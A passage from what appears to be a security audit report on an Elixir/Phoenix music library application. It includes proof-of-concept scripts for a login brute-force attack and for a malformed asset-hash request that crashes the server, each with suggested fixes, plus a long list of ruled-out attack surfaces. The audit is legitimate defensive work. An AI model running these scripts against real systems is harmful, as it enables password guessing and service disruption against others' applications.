**Validation:** This script was not executed. Use only against a local disposable instance; it shows repeated failures receive redirects rather than 429/backoff.

```elixir
# scripts/music_library/login_bruteforce.exs
Mix.install([{:req, "~> 0.6"}, {:floki, "~> 0.38"}])

base = System.get_env("TARGET", "http://127.0.0.1:4003")
candidates = ~w(password password1 letmein musiclibrary change-me)

for candidate <- candidates do
  login = Req.get!(base <> "/login", redirect: false)

  csrf =
    login.body
    |> Floki.parse_document!()
    |> Floki.find("input[name='_csrf_token']")
    |> Floki.attribute("value")
    |> List.first()

  cookie =
    login
    |> Req.Response.get_header("set-cookie")
    |> List.first()
    |> String.split(";", parts: 2)
    |> hd()

  response =
    Req.post!(base <> "/sessions/create",
      headers: %{"cookie" => cookie},
      form: %{"_csrf_token" => csrf, "password" => candidate},
      redirect: false
    )

  IO.inspect({candidate, response.status, Req.Response.get_header(response, "location")})
end
```

**Prior art:** `git log --all --grep='brute|login rate|lockout'` and `git log -G '(rate|thrott|attempt|lockout)'` over the auth/controller found no mitigation or declined decision. Backlog search for login brute force returned no task. Production documentation lists only `LOGIN_PASSWORD` and no ingress throttle.

**Reach:** The production login route is public. Exploitation succeeds when the operator chooses a guessable/reused password; a generated high-entropy password makes online guessing impractical, but neither code nor documentation enforces that precondition.

**Rating:** High confidence that the control is absent; Medium severity/confidence for exploitation because password entropy is deployment-dependent. Compromise grants all application and monitoring functionality.

**Suggested fix:** Add bounded per-IP and global throttling with increasing delay and 429 responses, retain constant-time comparison, and emit authentication-attempt telemetry. Document and enforce a high-entropy production password or move to a mature authentication mechanism.

### F7 — Public asset decoder accepts non-string hashes and crashes during canonicalization

**Severity:** Low
**CWE:** CWE-20
**Location:** `lib/music_library/assets/transform.ex:57-68,91-96` | `lib/music_library_web/controllers/asset_controller.ex:12-21`
**Sinks:** S7

**Trace:** Anonymous client supplies base64url JSON such as `{"hash":{},"width":null}` → `Transform.decode/1` checks only that the top-level JSON is a map and `width` is valid → it returns `%Transform{hash: %{}, width: nil}` → `AssetController.show/2` calls `Transform.canonical_key/1` → string interpolation invokes `String.Chars` for a map and raises before the controller can return 400/404.

**Boundary:** This crosses the anonymous public-asset boundary. It does not require a valid/known asset hash.

**Validation:** This script was not executed.

```elixir
# scripts/music_library/asset_hash_shape_crash.exs
Mix.install([{:req, "~> 0.6"}, {:jason, "~> 1.4"}])

base = System.get_env("TARGET", "http://127.0.0.1:4003")

payload =
  %{"hash" => %{"attacker" => "controlled"}, "width" => nil}
  |> Jason.encode!()
  |> Base.url_encode64(padding: false)

response = Req.get!(base <> "/public/assets/" <> payload, redirect: false)
IO.inspect({response.status, response.body}, label: "malformed hash response")
# Vulnerable behavior: 500. Expected behavior after a fix: 400.
```

**Prior art:** Commit `92a36b91` (“Harden public asset endpoint against invalid payloads”, closing legacy issue #143) added safe base64/JSON handling and a null-hash 404. Commit `d8a67cd4` / ML-181 added width validation and canonicalization after a resource-consumption finding. ML-181's plan says canonicalization depends on “struct is now guaranteed valid,” but its acceptance criteria validate only `width`; `git log -S canonical_key` shows no later hash-shape guard. This is an unpatched variant of those fixes, not a repeat of the bounded-width finding.

**Reach:** Any Internet client can produce the 500. Repetition creates ErrorTracker occurrences and periodic notification work, but ErrorTracker fingerprints by location and notifier throttling limits distinct-email amplification.

**Rating:** High confidence, Low severity. The immediate impact is a cheap request-specific exception and observability noise; it does not disclose an asset or create code execution.

**Suggested fix:** Require `hash` to be a 64-character hexadecimal string (or `nil` only where explicitly supported) before constructing the struct, reject unknown/invalid field shapes, and add controller tests for map/list/number hashes and duplicate `Accept` headers.

## Ruled out

- **S8, S35** (step 4) — Width is now bounded to `1..2048` and cache keys are canonical per `(hash,width)`. ML-181/commit `d8a67cd4` explicitly accepted this finite range and deferred payload signing for the single-operator model. The remaining malformed-hash variant is reported as F7.
- **S9** (step 5) — Brave selected-image fetches accept a forged URL and follow redirects, but both callers are authenticated operator workflows intentionally downloading a selected image. `doc-19` previously declined this as SSRF under the single-user threat model. Reclassify if lower-privileged users are introduced; response-size/IP/redirect defenses would still be prudent hardening.
- **S10, S11** (step 5) — Dynamic Discogs/Cover Art URLs come from provider metadata or authenticated record refresh. No anonymous or lower-privileged caller can nominate them in the current model.
- **S12** (step 3) — Fixed API clients use HTTPS and Req's default certificate verification. Req strips authorization credentials on cross-host redirects by default. Discogs' custom verifier accepts only one fingerprinted expired cross-sign while retaining all other chain validation.
- **S13** (step 2) — Xmerl parses the response from the fixed Last.fm HTTPS endpoint, not callback/request XML. The token cannot inject raw XML syntax into the provider's response; exploitation requires Last.fm/TLS compromise.
- **S14** (step 5) — JSON/SSE decoders consume bounded route input or fixed-provider/database output in intended parsing flows. No unsafe Erlang term deserialization exists. Greps found no `binary_to_term/1` or `binary_to_term/2` call site.
- **S15** (step 3) — MDEx uses `MDEx.Document.default_sanitize_options()` for complete and streaming documents. Generated link URL/title/text is escaped, and double-bracket query content is URL-encoded before sanitization.
- **S16** (step 3/4) — Notes, chat, and record-set raw sinks consume MDEx-sanitized output; Lumis produces escaped highlighted HTML. Wikipedia HTML is the one unsanitized provider value, but commit `fbc548e9`/legacy issue #168 explicitly records the maintainer decision to trust MediaWiki's sanitized extract HTML.
- **S17** (step 3) — Both email builders HTML-escape every dynamic value before interpolation. Swoosh owns header serialization; no request-controlled raw email header path was found.
- **S18** (step 5) — External links are provider-originated and displayed only to the authenticated operator; buttons use `target="_blank"` with `noopener noreferrer`. Fixed MusicBrainz/Wikipedia URL constructors constrain the primary links.
- **S19** (step 3) — The changeset only accepts `http`/`https` schemes, and each artist/title/format replacement passes through `URI.encode_www_form/1`, which does encode `&`, `?`, `#`, and `=`. The prior `doc-20` parameter-smuggling claim is not reproducible with this encoder.
- **S20** (step 3) — Every provider/operator string entering Typst markup passes through `Typst.Format.escape/1`; layout numbers are internally computed integers.
- **S21** (step 3) — FTS terms double embedded quotes, wrap each token in phrase syntax, and reach `MATCH` through Ecto parameters. Commit `ba256682` previously fixed special-character FTS crashes.
- **S22** (step 3) — All hostile values in Ecto fragments use `^` bindings/placeholders. Fragment strings, JSON paths, collations, functions, and aggregate syntax are static.
- **S23** (step 3) — Record-set CASE clause count is dynamic but IDs/positions are placeholders. Scrobble-rule column and JSON path are private-call literals (`album/$.title`, `artist/$.name`); rule values remain parameters. Prior ML-99 review reached the same injection conclusion.
- **S24** (step 3) — Telemetry SQL binds metric key/time/limit; health, VACUUM, and PRAGMA statements are constants. No request value becomes SQL structure.
- **S25** (step 3) — sqlite-vec macros emit static function names and Ecto-bound values. Embedding dimensions originate from the fixed OpenAI model and schema type; no SQL text interpolation was found.
- **S26** (step 1) — Migration SQL/DDL is static and runs only under trusted operator/release control; values do not cross an attacker boundary.
- **S27** (step 2) — File paths are generated by Phoenix's upload writer, not supplied by the browser. Upload size defaults to LiveView's 8 MB cap. Image bytes are attacker-shaped only after authenticated operator access.
- **S28** (step 2) — QueryReporter is dev-only and its path is explicitly supplied by a trusted IEx/Tidewave developer. Parameter serialization doubles SQL quotes; output is never executed by the application.
- **S29** (step 2) — Release Mix tasks are local developer operations using fixed HTTPS metadata endpoints and predetermined/configured project files.
- **S30** (step 2) — Prettier formatting runs during trusted local formatting. It passes the generated temp filename as an argument list (not through a shell); executable resolution and source content are under developer control.
- **S31** (step 1) — Native extension paths derive from an internal OS/architecture allowlist and literal `unicode`/`vec0` names. The bundled shared libraries are executable release assets; write access to them already subsumes code execution.
- **S32** (step 3/4) — Local auth uses `Plug.Crypto.secure_compare/2`; secrets use Cloak AES-GCM with a 12-byte IV and a runtime 32-byte key; asset hashes/cert fingerprints use SHA-256. Last.fm MD5 is mandated by Last.fm's authentication protocol and is not used for local password storage or collision-sensitive data.
- **S33** (step 1) — `MusicLibraryWeb.__using__/1` is compile-time dispatch from literal `use MusicLibraryWeb, :controller/:live_view/...` calls. No runtime boundary supplies `which`.
- **S34** (step 3) — `String.to_existing_atom/1` cannot allocate atoms. A forged authenticated value may crash only that operator LiveView; it does not leak atoms or cross a lower-privilege boundary.
- **S36** (step 1, except S6 use in F4) — ErrorNotifier and telemetry handlers receive internal library events with fixed handler IDs/metric definitions. QueryReporter is developer-installed. No external value chooses a module/function handler.
- **S37** (step 3) — All regexes are static; inspected expressions are linear or tightly bounded and do not contain nested ambiguous quantifiers driven by attacker pattern syntax. Retry delays are parsed and clamped.
- **S38** (step 2, except the callback write in F2) — Record-set ordering races and asset pruning involve actions by the sole authenticated operator/background scheduler; no cross-tenant authorization invariant depends on the check-then-act result.
- **S39** (step 5) — Pagination/streams terminate based on fixed HTTPS provider responses or finite local rows. An endless full-page response requires provider/TLS compromise; Oban controls worker retries and queue concurrency.
- **S40** (step 2) — Collection/error API limits are not upper-bounded, but callers must possess the all-powerful API bearer token. In the documented single-operator model that token holder is trusted to read the complete datasets.
- **S41** (step 2) — Production backup shell variables are constants, digit-only timestamps, trusted aliases, or quoted local paths. No request/provider value reaches the remote shell string.
- **S42** (step 2) — Database/build paths and host/port values are documented operator configuration. Treating write access to deployment environment as an attacker precondition would be circular.
- **S43** (step 1) — Blob data, MIME type, and filename are generated by the server's tracklist-PDF event; no independent hostile browser input reaches the listener. The download attribute does not write an arbitrary server path.
- **S44** (step 2) — LiveDebugger does install an eval/message gadget, but the dependency is `only: :dev`, starts its own endpoint on loopback by default, and is intended for a trusted local developer. It is not present in production. The separately exposed main-app LiveReload log socket is covered by F4.
- **S45** (step 5) — CSP's `unsafe-inline` and `wasm-unsafe-eval` are deliberate LiveView/colocated-hook/barcode WASM compatibility choices. No unsanitized HTML/script sink capable of exploiting those allowances was found; CSP remains defense in depth rather than the primary XSS control.
- **S46** (step 3) — Production logs pass through `SingleLineFormatter`, which escapes embedded newlines, and Logster filters password/token params. Provider bodies may still be operationally sensitive, but no credential-bearing request body or local secret reaches an attacker-readable production log endpoint without the API/Coolify tokens.
